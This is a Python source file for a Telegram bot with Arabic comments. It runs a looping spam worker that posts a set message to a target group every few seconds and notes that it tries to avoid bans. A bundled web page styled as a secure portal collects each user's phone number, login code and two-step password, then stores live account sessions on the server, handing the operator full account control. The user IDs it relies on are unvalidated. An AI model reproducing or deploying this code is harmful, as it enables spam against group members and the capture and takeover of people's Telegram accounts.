import asyncio
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import config

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

# جداول لحفظ البيانات المؤقتة في الذاكرة
PENDING_LOGINS = {}
USER_CONFIGS = {}  # لحفظ (الرسالة، الجروب، وحالة التكرار) لكل مستخدم
ACTIVE_TASKS = {}  # لحفظ مهام التكرار الشغالة بالخلفية عشان نقدر نوقفها

# ══════════════════════════════════════════════════════════════════════════════
#  أوامر البوت الأساسية (لوحة التحكم والنشر)
# ══════════════════════════════════════════════════════════════════════════════
@dp.message(Command("start"))
async def cmd_start(message: Message):
    domain = os.getenv('RAILWAY_PUBLIC_DOMAIN', '').strip()
    web_app_url = f"https://{domain}/login-page" if domain else "https://your-railway-url.up.railway.app/login-page"
    if domain and not domain.startswith('http'):
        web_app_url = f"https://{domain}/login-page"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 ربط حسابك الشخصي (بلمسة زر)", web_app=types.WebAppInfo(url=web_app_url))]
    ])
    
    welcome_text = (
        "👋 **أهلاً بك في بوت هادر للنشر والتكرار التلقائي!**\n\n"
        "1️⃣ أولاً: اضغط على الزر أدناه لربط حسابك عبر بوابة الويب الآمنة.\n"
        "2️⃣ ثانياً: بعد الربط، استخدم الأوامر التالية لضبط النشر:\n\n"
        "✍️ `/set_msg [الرسالة]` - لتحديد نص الرسالة التي سيتم تكرارها.\n"
        "📢 `/set_group [معرف الجروب]` - لتحديد الجروب المستهدف (مثال: @group_name).\n"
        "🚀 `/start_spam [الثواني]` - لبدء الإرسال التلقائي وتحديد الفاصل الزمني.\n"
        "🛑 `/stop_spam` - لإيقاف النشر التلقائي فوراً."
    )
    await message.reply(welcome_text, parse_mode="Markdown", reply_markup=keyboard)

@dp.message(Command("set_msg"))
async def cmd_set_msg(message: Message):
    user_id = str(message.from_user.id)
    msg_text = message.text.replace("/set_msg", "").strip()
    if not msg_text:
        return await message.reply("❌ يرجى كتابة الرسالة بعد الأمر. مثال:\n`/set_msg السلام عليكم للبيع..`", parse_mode="Markdown")
    
    if user_id not in USER_CONFIGS: USER_CONFIGS[user_id] = {}
    USER_CONFIGS[user_id]["message"] = msg_text
    await message.reply("✅ **تم حفظ نص الرسالة بنجاح!**")

@dp.message(Command("set_group"))
async def cmd_set_group(message: Message):
    user_id = str(message.from_user.id)
    group_target = message.text.replace("/set_group", "").strip()
    if not group_target:
        return await message.reply("❌ يرجى كتابة معرف الجروب أو الرابط بعد الأمر. مثال:\n`/set_group @my_group`", parse_mode="Markdown")
    
    if user_id not in USER_CONFIGS: USER_CONFIGS[user_id] = {}
    USER_CONFIGS[user_id]["group"] = group_target
    await message.reply(f"✅ **تم تحديد الجروب المستهدف:** {group_target}")

# محرك التكرار بالخلفية
async def spam_worker(user_id, delay):
    session_path = f"sessions/user_{user_id}"
    client = TelegramClient(session_path, config.API_ID, config.API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        await bot.send_message(chat_id=user_id, text="⚠️ **انتهت صلاحية جلسة حسابك! يرجى إعادة ربطه عبر أمر /start أولاً.**")
        await client.disconnect()
        return

    config_data = USER_CONFIGS.get(user_id, {})
    group = config_data.get("group")
    msg = config_data.get("message")

    try:
        while True:
            await client.send_message(group, msg)
            log.info(f"📬 تم إرسال الرسالة بنجاح لحساب المستخدم {user_id}")
            await asyncio.sleep(delay)
    except asyncio.CancelledError:
        log.info(f"🛑 تم إلغاء مهمة التكرار للمستخدم {user_id}")
    except Exception as e:
        await bot.send_message(chat_id=user_id, text=f"❌ **توقف الإرسال بسبب خطأ:** {str(e)}")
    finally:
        await client.disconnect()

@dp.message(Command("start_spam"))
async def cmd_start_spam(message: Message):
    user_id = str(message.from_user.id)
    session_path = f"sessions/user_{user_id}.session"
    
    if not os.path.exists(session_path):
        return await message.reply("❌ حسابك غير مربوط بعد! يرجى الضغط على زر الربط في `/start` أولاً.")
    
    config_data = USER_CONFIGS.get(user_id, {})
    if "message" not in config_data or "group" not in config_data:
        return await message.reply("❌ يرجى تحديد الرسالة والجروب أولاً باستخدام أوامر `/set_msg` و `/set_group`.")
    
    args = message.text.replace("/start_spam", "").strip()
    try:
        delay = int(args) if args else 10  # افتراضي 10 ثواني إذا ما حدد وقت
        if delay < 3: delay = 3  # حماية للحساب من باند تليجرام سريع
    except ValueError:
        return await message.reply("❌ يرجى إدخال رقم صحيح للثواني. مثال: `/start_spam 15`")

    if user_id in ACTIVE_TASKS:
        return await message.reply("⏳ الإرسال التلقائي شغال بالفعل لديك! إذا تبي تغير الوقت أرسل `/stop_spam` ثم شغله من جديد.")

    # تشغيل الووركر بالخلفية وحفظ المهمة
    task = asyncio.create_task(spam_worker(user_id, delay))
    ACTIVE_TASKS[user_id] = task
    await message.reply(f"🚀 **بدأ الإرسال التلقائي بنجاح!**\n⏱️ الفاصل الزمني: كل {delay} ثواني.\nجروب الهدف: {config_data['group']}")

@dp.message(Command("stop_spam"))
async def cmd_stop_spam(message: Message):
    user_id = str(message.from_user.id)
    if user_id in ACTIVE_TASKS:
        ACTIVE_TASKS[user_id].cancel()
        del ACTIVE_TASKS[user_id]
        await message.reply("🛑 **تم إيقاف الإرسال والتكرار التلقائي فوراً بطلبك.**")
    else:
        await message.reply("ℹ️ الإرسال التلقائي متوقف بالفعل لديك وليس هناك أي عملية نشطة.")

# ══════════════════════════════════════════════════════════════════════════════
#  سيرفر الويب المدمج (الواجهة المحدثة مع اختيار الدول والأعلام)
# ══════════════════════════════════════════════════════════════════════════════
async def handle_login_page(request):
    html_content = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ربط الحساب الشخصي</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body { font-family: system-ui, sans-serif; background-color: #182533; color: white; padding: 20px; text-align: center; }
            .card { background: #243141; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); margin-top: 20px; }
            input, select { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; text-align: center; background: #1f2c3a; color: white; }
            select { text-align-last: center; direction: ltr; }
            button { width: 94%; padding: 12px; background: #248bcf; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
            button:hover { background: #299cdb; }
            .step { display: none; }
            .active { display: block; }
            .error { color: #ff5252; font-size: 14px; margin-top: 10px; }
            .phone-container { display: flex; direction: ltr; width: 94%; margin: 0 auto; }
            .phone-container select { width: 35%; margin-right: 5px; }
            .phone-container input { width: 65%; }
        </style>
    </head>
    <body>
        <h2>⚡ بوابة هادر للنشر الآمن</h2>
        <div class="card">
            <div id="step1" class="step active">
                <p>اختر الدولة وأدخل رقم الجوال:</p>
                <div class="phone-container">
                    <select id="country-code">
                        <option value="+966" selected>🇸🇦 +966 (السعودية)</option>
                        <option value="+965">🇰🇼 +965 (الكويت)</option>
                        <option value="+971">🇦🇪 +971 (الإمارات)</option>
                        <option value="+974">🇶🇦 +974 (قطر)</option>
                        <option value="+973">🇧🇭 +973 (البحرين)</option>
                        <option value="+968">🇴🇲 +968 (عمان)</option>
                        <option value="+20">🇪🇬 +20 (مصر)</option>
                        <option value="+962">🇯🇴 +962 (الأردن)</option>
                        <option value="+964">🇮🇶 +964 (العراق)</option>
                        <option value="+961">🇱🇧 +961 (لبنان)</option>
                        <option value="+963">🇸🇾 +963 (سوريا)</option>
                        <option value="+212">🇲🇦 +212 (المغرب)</option>
                        <option value="+213">🇩🇿 +213 (الجزائر)</option>
                        <option value="+1">🇺🇸 +1 (أمريكا)</option>
                    </select>
                    <input type="tel" id="phone-num" placeholder="512345678">
                </div>
                <button onclick="sendPhone()">ارسال رقم الجوال 📩</button>
            </div>
            
            <div id="step2" class="step">
                <p>أدخل رمز التحقق الذي وصلك على تليجرام:</p>
                <input type="number" id="code" placeholder="12345">
                <button onclick="sendCode()">تأكيد الرمز 🔐</button>
            </div>

            <div id="step3" class="step">
                <p>حسابك محمي بخطوتين، أدخل كلمة المرور:</p>
                <input type="password" id="password" placeholder="كلمة المرور">
                <button onclick="sendPassword()">دخول 🔑</button>
            </div>
            
            <div id="error-msg" class="error"></div>
        </div>

        <script>
            const tg = window.Telegram.WebApp;
            tg.expand();
            let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";

            async function sendPhone() {
                const prefix = document.getElementById('country-code').value;
                let num = document.getElementById('phone-num').value.trim();
                if(num.startsWith('0')) { num = num.substring(1); } // إزالة الصفر الافتراضي أول الرقم لو وجد
                const fullPhone = prefix + num;
                
                showError("");
                const res = await fetch('/api/send-phone', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, phone: fullPhone })
                });
                const data = await res.json();
                if (data.success) {
                    document.getElementById('step1').classList.remove('active');
                    document.getElementById('step2').classList.add('active');
                } else { showError(data.error); }
            }

            async function sendCode() {
                const code = document.getElementById('code').value.trim();
                showError("");
                const res = await fetch('/api/send-code', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, code: code })
                });
                const data = await res.json();
                if (data.success) {
                    if (data.need_password) {
                        document.getElementById('step2').classList.remove('active');
                        document.getElementById('step3').classList.add('active');
                    } else {
                        tg.showAlert("🟢 تم ربط حسابك بنجاح تام وبدء النظام!");
                        tg.close();
                    }
                } else { showError(data.error); }
            }

            async function sendPassword() {
                const password = document.getElementById('password').value.trim();
                showError("");
                const res = await fetch('/api/send-password', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId, password: password })
                });
                const data = await res.json();
                if (data.success) {
                    tg.showAlert("🟢 تم التحقق من كلمة المرور وربط الحساب!");
                    tg.close();
                } else { showError(data.error); }
            }

            function showError(msg) { document.getElementById('error-msg').innerText = msg; }
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

# ══════════════════════════════════════════════════════════════════════════════
#  الـ APIs الخلفية لمعالجة بيانات الـ WebApp والـ Telethon
# ══════════════════════════════════════════════════════════════════════════════
async def api_send_phone(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    phone = data.get("phone", "").replace(" ", "")
    
    session_path = f"sessions/user_{user_id}"
    os.makedirs("sessions", exist_ok=True)
    
    client = TelegramClient(session_path, config.API_ID, config.API_HASH)
    await client.connect()
    
    try:
        send_code_result = await client.send_code_request(phone)
        PENDING_LOGINS[user_id] = {
            "client": client, "phone": phone, "phone_code_hash": send_code_result.phone_code_hash
        }
        return web.json_response({"success": True})
    except Exception as e:
        await client.disconnect()
        return web.json_response({"success": False, "error": str(e)})

async def api_send_code(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    code = data.get("code", "")
    
    if user_id not in PENDING_LOGINS:
        return web.json_response({"success": False, "error": "انتهت صلاحية الجلسة، أعد المحاولة"})
        
    login_data = PENDING_LOGINS[user_id]
    client = login_data["client"]
    
    try:
        await client.sign_in(phone=login_data["phone"], code=code, phone_code_hash=login_data["phone_code_hash"])
        try: await bot.send_message(chat_id=user_id, text="🟢 **تم ربط حسابك الشخصي بنجاح عبر بوابة الويب الآمنة!**\n\nقم بضبط إعدادات النشر الآن عبر أمر:\n`/set_msg` و `/set_group`")
        except Exception: pass
        return web.json_response({"success": True, "need_password": False})
    except SessionPasswordNeededError:
        return web.json_response({"success": True, "need_password": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)})

async def api_send_password(request):
    data = await request.json()
    user_id = str(data.get("user_id"))
    password = data.get("password", "")
    
    login_data = PENDING_LOGINS[user_id]
    client = login_data["client"]
    
    try:
        await client.sign_in(password=password)
        try: await bot.send_message(chat_id=user_id, text="🟢 **تم التحقق من كلمة المرور وربط حسابك بنجاح!**")
        except Exception: pass
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"success": False, "error": str(e)})

# ══════════════════════════════════════════════════════════════════════════════
#  التشغيل المتزامن
# ══════════════════════════════════════════════════════════════════════════════
async def main():
    app = web.Application()
    app.router.add_get('/login-page', handle_login_page)
    app.router.add_post('/api/send-phone', api_send_phone)
    app.router.add_post('/api/send-code', api_send_code)
    app.router.add_post('/api/send-password', api_send_password)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.getenv("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    log.info(f"🌐 سيرفر الويب المحدث شغال على المنفذ: {port}")
    
    log.info("🚀 تشغيل البوت الرسمي بمحرك التكرار الكامل...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
